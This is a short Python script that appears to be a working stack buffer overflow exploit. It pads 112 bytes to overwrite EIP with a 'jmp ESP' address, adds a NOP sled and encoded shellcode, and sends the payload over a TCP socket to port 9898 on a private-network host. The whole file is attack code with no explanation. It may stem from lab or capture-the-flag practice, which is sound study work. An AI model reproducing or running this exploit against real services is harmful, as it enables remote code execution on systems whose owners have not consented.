#!/usr/bin/python3

import socket

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08" # jmp ESP

shellcode =  b""
shellcode += b"\xba\x93\x5d\x0b\xf6\xda\xdb\xd9\x74\x24\xf4"
shellcode += b"\x5d\x31\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e"
shellcode += b"\x03\xc6\x53\xe9\x03\xd9\xb0\x1a\x08\x4a\x04"
shellcode += b"\xb6\xa5\x6e\x03\xd9\x8a\x08\xde\x9a\x78\x8d"
shellcode += b"\x50\xa5\xb3\xad\xd8\xa3\xb2\xc5\x1a\xfb\x45"
shellcode += b"\x04\xf3\xfe\x45\x27\xb8\x76\xa4\x97\xd8\xd8"
shellcode += b"\x76\x84\x97\xda\xf1\xcb\x15\x5c\x53\x63\xc8"
shellcode += b"\x72\x27\x1b\x7c\xa2\xe8\xb9\x15\x35\x15\x6f"
shellcode += b"\xb5\xcc\x3b\x3f\x32\x02\x3b"

after_eip = b"\x90"*32 + shellcode #32 NOPs + Shellcode

payload = before_eip + eip + after_eip 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.x.x", 9898))
s.send(payload)
s.close()
